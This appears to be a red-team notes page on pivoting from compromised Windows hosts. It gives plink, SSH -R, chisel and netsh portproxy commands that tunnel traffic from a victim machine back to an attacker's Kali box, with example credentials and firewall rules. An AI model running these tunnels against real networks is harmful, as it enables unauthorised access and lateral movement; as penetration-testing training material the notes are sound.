---
metaLinks:
  alternates:
    - >-
      https://app.gitbook.com/s/qDX4NWkPelZggTpGCfyF/offensive-treasure/red-team/lateral-movement/pivoting/window
---

# Window

### Plink

[https://www.chiark.greenend.org.uk/\~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

**First**: We need to change ssh configuration on our kali machine.

```basic
PermitRootLogin no    #Change This
PermitRootLogin Yes     #To This

#Then restart the service
sudo service ssh restart
```

We can customize the port if port 22 blocked on the report machine.

**Second**: Let start execute plink command on the victim machine

```
plink.exe -P 2222 -l root -pw toor -R 445:127.0.0.1:445 10.10.14.12
```

<figure><img src="../../../../.gitbook/assets/image (653).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (702).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (649).png" alt=""><figcaption></figcaption></figure>

### Plink with id\_rsa

* Create ssh-keygen and save .pub value into authorized\_key
* install putty tool and convert id\_rsa to .ppk file

```basic
└─$ sudo apt install putty-tools
└─$ puttygen id_rsa -o key.ppk    
```

* Transfer **key.ppk** to window machine that we compromised

<figure><img src="../../../../.gitbook/assets/image (656).png" alt=""><figcaption></figcaption></figure>

* on window machine, we can use plink to connect to our kali machine fore reverse port

```basic
Desktop>plink.exe -R 445:192.168.33.132:445 pwned@10.104.60.242 -i key.ppk -N
Using username "pwned".
Access granted. Press Return to begin session.
```

<figure><img src="../../../../.gitbook/assets/image (659).png" alt=""><figcaption></figcaption></figure>

We can access via **127.0.0.1:445**

### Chisel

On kali machine

<pre class="language-basic"><code class="lang-basic"><strong>./chisel server -p 6666 --socks5 –reverse
</strong></code></pre>

on window server machine

```basic
chisel.exe client 10.10.10.10:6666 R:1080:socks
```

Then we can use proxychain for remote to target machine via sock proxy

```basic
proxychains xfreerdp /u:user /p:password123 /cert:ignore /v:10.10.10.11
```

### Proxychains on Window machine

* Create ssh-keygen without password. It will create to file **id\_**_**rsa** and **id\_rsa.pub**_

<figure><img src="../../../../.gitbook/assets/image (700).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (618).png" alt=""><figcaption></figcaption></figure>

* copy value of i&#x64;_&#x72;sa.pub and paste into **.ssh/authorized\_**_**key** file

<figure><img src="../../../../.gitbook/assets/image (235).png" alt=""><figcaption></figcaption></figure>

* Transfer **id\_rsa** file to window machine we compromise

<figure><img src="../../../../.gitbook/assets/image (274).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../../.gitbook/assets/image (588).png" alt=""><figcaption></figcaption></figure>

* Connect ssh back to our kali machine

```
ssh -R 9050 pwned@10.104.60.242 -i id_rsa -f -N
```

Then on our kali will open port 9050

<figure><img src="../../../../.gitbook/assets/image (607).png" alt=""><figcaption></figcaption></figure>

### chisel

[https://github.com/jpillora/chisel/releases](https://github.com/jpillora/chisel/releases)

* On server (kali machine)

```
└─$ chisel server -p 8888 --reverse &
```

* On client (Window)

```
chisel-window.exe client 10.104.60.242:8888 R:9050:socks &
2022/05/10 03:18:16 client: Connecting to ws://10.104.60.242:8888
2022/05/10 03:18:16 client: Connected (Latency 153.9µs)
```

on /etc/proxychains4.conf

```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"

socks5  127.0.0.1 9050
```

### Netsh

<figure><img src="../../../../.gitbook/assets/image (891).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```powershell
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
```
{% endcode %}

Where:

* **listenaddress** is the IP address to listen on (probably always 0.0.0.0).
* **listenport** is the port to listen on.
* **connectaddress** is the destination IP address.
* **connectport** is the destination port.
* **protocol** to use (always TCP).

Example:

{% code overflow="wrap" %}
```powershell
PS C:\Users\Public> netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=80 connectaddress=192.168.10.1 connectport=80 protocol=tcp

PS C:\Users\Public> netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=443 connectaddress=192.168.10.1 connectport=443 protocol=tcp
```
{% endcode %}

Show the portproxy:

```powershell
PS C:\>netsh interface portproxy show v4tov4

Listen on ipv4:             Connect to ipv4:

Address         Port        Address         Port
--------------- ----------  --------------- ----------
0.0.0.0         80          192.168.10.1    80
0.0.0.0         443         192.168.10.1    443
```

Remove the portproxy:

```powershell
PS C:\>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=80
PS C:\>netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=443
```

Create Local Firewall Rule before netsh

```powershell
PS C:\>New-NetFirewallRule -DisplayName "80-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 80
PS C:\>New-NetFirewallRule -DisplayName "443-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 443
```

Remove Local Firewall Rule

```powershell
PS C:\>Remove-NetFirewallRule -DisplayName "80-In"
PS C:\>Remove-NetFirewallRule -DisplayName "443-In"
```
